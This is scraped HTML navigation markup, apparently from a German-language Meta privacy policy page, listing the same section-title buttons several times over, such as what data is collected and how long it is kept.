                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
